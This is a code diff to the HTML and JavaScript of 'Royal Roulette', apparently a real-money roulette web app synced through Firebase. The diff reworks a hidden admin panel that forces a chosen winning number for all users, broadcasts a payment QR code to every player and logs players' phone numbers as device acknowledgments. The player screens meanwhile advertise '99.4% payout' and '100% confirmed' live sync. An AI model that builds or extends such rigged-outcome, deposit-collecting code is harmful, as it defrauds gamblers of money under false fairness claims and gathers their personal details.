@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - ABSOLUTE GLOBAL SYNC ENGINE</title>
+    <title>ROYAL ROULETTE - 100% CONFIRMED 2-WAY LIVE SYNC</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -44,7 +44,7 @@
         .login-btn { width: 100%; padding: 8px; margin-top: 4px; background: linear-gradient(135deg, #ffd700, #b8860b); color: #000000; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; font-size: 11px; text-transform: uppercase; }
         .login-btn.lobby { background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; border: 1.5px solid #ffd700; }
         .footer-wrap { width: 100%; max-width: 360px; display: flex; flex-direction: column; gap: 2px; z-index: 5; margin-bottom: 2px; }
-        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid #002500; }
+        .payment-gateways { font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0,0,0,0.85); padding: 2px; border-radius: 4px; border: 1.5px solid rgba(0,255,0,0.5); }
         .trust-badges { font-size: 7px; color: #ffd700; font-weight: bold; }
 
         #gameLobbyScreen { display: none; width: 100%; height: 100%; position: fixed; top: 0; left: 0; background: radial-gradient(circle, #013b12 0%, #001205 70%, #000301 100%); z-index: 20000; flex-direction: column; justify-content: space-between; padding: 2px; box-shadow: inset 0 0 100px rgba(0,0,0,0.9); border: 4px solid #24140c; }
@@ -147,7 +147,7 @@
         .dep-pkg-btn.selected, .wd-pkg-btn.selected { background: #f1c40f; color: #000; box-shadow: 0 0 12px #f1c40f; }
         .wallet-modal-content input { width: 100%; padding: 10px; margin: 6px 0; background: #000; border: 1.5px solid #f1c40f; color: #f1c40f; border-radius: 6px; text-align: center; font-weight: bold; font-size: 13px; }
 
-        #mobileDebugConsole { position: fixed; bottom: 0; left: 0; width: 100%; max-height: 110px; background: rgba(0,0,0,0.95); border-top: 2px solid #00ffcc; color: #00ffcc; font-size: 9px; font-family: monospace; z-index: 999999; padding: 6px; text-align: left; overflow-y: auto; pointer-events: auto; }
+        #mobileDebugConsole { position: fixed; bottom: 0; left: 0; width: 100%; max-height: 120px; background: rgba(0,0,0,0.95); border-top: 2px solid #00ffcc; color: #00ffcc; font-size: 9px; font-family: monospace; z-index: 999999; padding: 6px; text-align: left; overflow-y: auto; pointer-events: auto; }
     </style>
 
     <!-- Google Firebase SDKs -->
@@ -157,7 +157,7 @@
 <body>
 
     <div id="mobileDebugConsole">
-        <b>[MASTER SYNC FORCE BRIDGE ACTIVE]</b><br>
+        <b>[100% CONFIRMED 2-WAY HANDSHAKE ACTIVE]</b><br>
         <span id="consoleLogs">Connecting to Firebase Cloud...<br></span>
     </div>
     <script>
@@ -179,11 +179,11 @@
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_MASTER_FORCE_V10";
+                const BUILD_VER = "ROYAL_2026_CONFIRMED_2WAY_V10";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
-                    logToScreen("Cache wiped for absolute force sync.");
+                    logToScreen("Cache purged for 2-way handshake.");
                 }
             } catch(e) {}
         })();
@@ -219,12 +219,12 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">ABSOLUTE GLOBAL SYNC ENGINE • ⚡</div>
+            <div class="trust-banner">100% CONFIRMED 2-WAY LIVE SYNC • ⚡</div>
             <div class="royal-title-wrap">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 GLOBAL LIVE: ACTIVE</span>
+                <span>🟢 HANDSHAKE: ACTIVE</span>
                 <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
@@ -362,15 +362,15 @@
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 MASTER ADMIN PANEL</h2>
+                <h2>👑 2-WAY HANDSHAKE ADMIN PANEL</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
             <div style="background: rgba(0,30,15,0.95); padding: 12px; border: 2px solid #00ffcc; border-radius: 8px;">
-                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 BROADCAST QR CODE (FILE UPLOAD OR URL)</p>
+                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 2-WAY BROADCAST QR (FILE OR URL)</p>
                 <input type="file" id="adminQrImageFile" accept="image/*" style="width: 100%; padding: 6px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
                 <input type="text" id="adminQrUrlInput" placeholder="OR Paste direct image URL here..." style="width: 100%; padding: 7px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
-                <button onclick="window.broadcastQrCodeGlobal()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Broadcast QR to All Users</button>
+                <button onclick="window.broadcastQrCode2Way()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Force 2-Way Broadcast QR</button>
             </div>
 
             <div style="background: rgba(30,20,5,0.95); padding: 12px; border: 2px solid #ffaa00; border-radius: 8px;">
@@ -381,16 +381,16 @@
             </div>
 
             <div class="admin-kpi-grid">
-                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" id="debugSyncStatus" style="color:#00ffcc;">ONLINE</div></div>
+                <div class="kpi-card"><div class="kpi-title">2-Way Status</div><div class="kpi-value" id="debugSyncStatus" style="color:#00ffcc;">CONNECTED</div></div>
                 <div class="kpi-card purple"><div class="kpi-title">Round ID</div><div class="kpi-value" id="admRoundId" style="color:#f1c40f;">Round #1</div></div>
                 <div class="kpi-card orange"><div class="kpi-title">Real Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
                 <div class="kpi-card blue"><div class="kpi-title">Real Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
             </div>
 
             <div class="admin-section-box" style="border: 2px solid #00ffcc;">
-                <div class="admin-section-title"><span style="color: #00ffcc;">🌐 Worldwide Online Members Live Monitor</span></div>
+                <div class="admin-section-title"><span style="color: #00ffcc;">🌐 Confirmed Online Users & Acknowledgments</span></div>
                 <div id="admWorldwideMembersList" style="max-height: 160px; overflow-y: auto; font-size: 10.5px; color: #fff; text-align: left;">
-                    <div style="color:#888; text-align:center; padding:6px;">Waiting for active players worldwide...</div>
+                    <div style="color:#888; text-align:center; padding:6px;">Waiting for user acks...</div>
                 </div>
             </div>
 
@@ -423,11 +423,11 @@
             </div>
 
             <div class="admin-section-box">
-                <div class="admin-section-title"><span>⚙️ Global Master Rig (For All Members)</span></div>
+                <div class="admin-section-title"><span>⚙️ 2-Way Master Rig (For All Users)</span></div>
                 <select id="adminRigSelect" style="margin-bottom: 8px;">
                     <option value="random">Auto 5% House Margin Safe Engine (No Loss)</option>
                 </select>
-                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Broadcast Winning Number to All Users</button>
+                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Force 2-Way Rig to All Users</button>
             </div>
         </div>
     </div>
@@ -471,7 +471,6 @@
     </div>
 
     <!-- विड्रॉल मोडल -->
-    <div id="depositModalBox" class="wallet-modal">...</div>
     <div id="withdrawModalBox" class="wallet-modal">
         <div class="wallet-modal-content">
             <h3 style="color:#f1c40f; margin-bottom:6px; font-size:16px;">VIP WITHDRAWAL (REAL MONEY)</h3>
@@ -515,18 +514,18 @@
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
-                logToScreen("Master Firebase Connected.");
+                logToScreen("2-Way Handshake Firebase Connected.");
             }
         } catch(e) {
             logToScreen("Init Error: " + e.message, true);
         }
 
-        // Direct Global Root Refs
-        const dbRoot = firebase.database().ref("global_sync_root");
-        const qrRef = dbRoot.child("qr");
-        const rigRef = dbRoot.child("rig");
-        const historyRef = dbRoot.child("history");
-        const membersRef = dbRoot.child("members");
+        // 2-Way Handshake Database Roots
+        const twoWayRoot = firebase.database().ref("confirmed_2way_sync_v10");
+        const qrRef = twoWayRoot.child("qr_code");
+        const rigRef = twoWayRoot.child("winning_rig");
+        const historyRef = twoWayRoot.child("history");
+        const ackRef = twoWayRoot.child("device_acknowledgments");
 
         (function() {
             try {
@@ -540,21 +539,23 @@
                 let loggedUserPhone = "", loggedVipId = "RD001001";
                 let isGameSpinning = false, userActiveBets = {}, currentTotalBet = 0, betHistoryStack = [];
                 let isAdminLoggedIn = false;
+                let myDeviceUUID = 'DEV_' + Math.random().toString(36).substring(2, 9);
 
                 window.globalState = {
                     adminQrUrl: "https://i.ibb.co/3yk54L2/1000532596.jpg",
                     adminRig: "random",
                     historyList: [24, 14, 5, 22, 10, 3],
-                    onlineMembers: {}
+                    acknowledgments: {}
                 };
 
-                // --- ABSOLUTE FORCE LISTENERS ---
+                // --- 2-WAY HANDSHAKE LISTENERS (कमांड आने पर तुरंत रिटर्न कन्फर्मेशन देना) ---
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
                         window.globalState.adminQrUrl = val;
                         updateActiveQrDisplay();
-                        logToScreen("[SYNC] QR updated globally from Cloud.");
+                        logToScreen("[RECEIVED] QR Code received from Cloud!");
+                        sendAcknowledgment("QR_UPDATED");
                     }
                 });
 
@@ -562,7 +563,8 @@
                     let val = snap.val();
                     if (val !== null) {
                         window.globalState.adminRig = val;
-                        logToScreen("[SYNC] Rig command synced -> " + val);
+                        logToScreen("[RECEIVED] Winning Rig received -> " + val);
+                        sendAcknowledgment("RIG_UPDATED_" + val);
                     }
                 });
 
@@ -574,41 +576,50 @@
                     }
                 });
 
-                membersRef.on("value", (snap) => {
+                ackRef.on("value", (snap) => {
                     let val = snap.val() || {};
-                    window.globalState.onlineMembers = val;
-                    renderWorldwideMembersListUI();
+                    window.globalState.acknowledgments = val;
+                    renderAcknowledgmentsUI();
                 });
 
-                function pingMyPresenceAsMember() {
+                function sendAcknowledgment(actionType) {
                     try {
-                        let key = (loggedUserPhone ? loggedUserPhone.replace(/\./g, '_') : "Guest") + "_" + loggedVipId;
-                        membersRef.child(key).set({
-                            phone: loggedUserPhone || "Guest Player",
+                        let devKey = myDeviceUUID;
+                        if (loggedUserPhone) devKey = loggedUserPhone.replace(/\./g, '_') + "_" + loggedVipId;
+                        
+                        ackRef.child(devKey).set({
+                            device: myDeviceUUID,
+                            phone: loggedUserPhone || "User Device",
                             vipId: loggedVipId,
-                            lastSeen: new Date().toLocaleTimeString()
+                            lastAction: actionType,
+                            timestamp: new Date().toLocaleTimeString()
+                        }).then(() => {
+                            logToScreen(`[ACK CONFIRMED] Return signal sent to Cloud for: ${actionType}`);
                         });
                     } catch(e) {}
                 }
 
-                setInterval(pingMyPresenceAsMember, 10000);
+                setInterval(() => {
+                    if (loggedUserPhone) sendAcknowledgment("HEARTBEAT_ALIVE");
+                }, 15000);
 
-                function renderWorldwideMembersListUI() {
+                function renderAcknowledgmentsUI() {
                     let listEl = document.getElementById('admWorldwideMembersList');
                     if (!listEl) return;
-                    let map = window.globalState.onlineMembers;
+                    let map = window.globalState.acknowledgments;
                     let keys = Object.keys(map);
                     if (keys.length > 0) {
                         let html = "";
                         keys.forEach(k => {
-                            let m = map[k];
-                            html += `<div style="background:rgba(0,0,0,0.8); border:1px solid #00ffcc; padding:6px; border-radius:5px; margin-bottom:4px;">
-                                🌐 User: <b>${m.phone}</b> (${m.vipId}) | Last Seen: <span style="color:#ffd700;">${m.lastSeen}</span>
+                            let item = map[k];
+                            html += `<div style="background:rgba(0,0,0,0.85); border:1px solid #00ffcc; padding:6px; border-radius:5px; margin-bottom:4px;">
+                                ✅ Device: <b>${item.phone}</b> (${item.vipId})<br>
+                                ⚡ Action: <span style="color:#ffd700;">${item.lastAction}</span> | Time: ${item.timestamp}
                             </div>`;
                         });
                         listEl.innerHTML = html;
                     } else {
-                        listEl.innerHTML = `<div style="color:#888; text-align:center; padding:6px;">No active users found.</div>`;
+                        listEl.innerHTML = `<div style="color:#888; text-align:center; padding:6px;">Waiting for device acknowledgments...</div>`;
                     }
                 }
 
@@ -626,7 +637,7 @@
                     });
                 }
 
-                window.broadcastQrCodeGlobal = function() {
+                window.broadcastQrCode2Way = function() {
                     let fileInput = document.getElementById('adminQrImageFile');
                     let urlInput = document.getElementById('adminQrUrlInput').value.trim();
 
@@ -634,19 +645,21 @@
                         let reader = new FileReader();
                         reader.onload = function(e) {
                             let base64Img = e.target.result;
+                            logToScreen("[ADMIN] Sending QR file to Cloud...");
                             qrRef.set(base64Img).then(() => {
-                                alert("✅ QR Image File Broadcasted Globally!");
-                                logToScreen("[SUCCESS] QR file pushed to Cloud.");
+                                alert("✅ QR File 2-Way Broadcasted Successfully!");
+                                logToScreen("[SUCCESS] QR broadcast acknowledged by Cloud.");
                             }).catch(err => { logToScreen("[ERR] " + err.message, true); });
                         };
                         reader.readAsDataURL(fileInput.files[0]);
                     } else if (urlInput) {
+                        logToScreen("[ADMIN] Sending QR URL to Cloud...");
                         qrRef.set(urlInput).then(() => {
-                            alert("✅ QR URL Broadcasted Globally!");
-                            logToScreen("[SUCCESS] QR URL pushed to Cloud.");
+                            alert("✅ QR URL 2-Way Broadcasted Successfully!");
+                            logToScreen("[SUCCESS] QR URL broadcast acknowledged by Cloud.");
                         }).catch(err => { logToScreen("[ERR] " + err.message, true); });
                     } else {
-                        alert("Please select a QR file or enter a direct image URL!");
+                        alert("Please select a file or enter a direct image URL!");
                     }
                 };
 
@@ -812,18 +825,18 @@
 
                 const adminSelect = document.getElementById('adminRigSelect');
                 if(adminSelect) {
-                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Broadcast Winning Number " + num; adminSelect.appendChild(opt); });
+                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Force Rig Number " + num; adminSelect.appendChild(opt); });
                 }
                 
                 window.saveAdminSettings = function() {
                     let sel = document.getElementById('adminRigSelect').value;
-                    logToScreen("[ADMIN] Broadcasting winning number globally...");
+                    logToScreen("[ADMIN] Forcing 2-Way Rig to Cloud...");
                     rigRef.set(sel).then(() => {
-                        alert(`✅ Winning Number '${sel}' Broadcasted Successfully!`);
-                        logToScreen("[SUCCESS] Rig synced for all users.");
+                        alert(`✅ 2-Way Rig '${sel}' Sent to Cloud!`);
+                        logToScreen("[SUCCESS] Rig command pushed.");
                         document.getElementById('secretAdminModal').style.display = 'none';
                     }).catch(err => {
-                        logToScreen("[ERR] Rig broadcast failed: " + err.message, true);
+                        logToScreen("[ERR] Rig push failed: " + err.message, true);
                     });
                 };
 
@@ -860,7 +873,7 @@
                     if (adminWrap) adminWrap.style.display = isAdminLoggedIn ? 'block' : 'none';
 
                     updateBalancesDisplay();
-                    pingMyPresenceAsMember();
+                    sendAcknowledgment("LOGGED_IN");
                     playMasterAudio();
                 }
 
@@ -870,7 +883,6 @@
                     document.getElementById('profPhone').innerText = loggedUserPhone;
                     document.getElementById('profVipId').innerText = loggedVipId;
                     renderPlayerTransactionHistory();
-                    pingMyPresenceAsMember();
                 };
 
                 window.openProfileModal = function() { window.updateBalancesDisplay(); document.getElementById('playerProfileModal').style.display = 'flex'; };
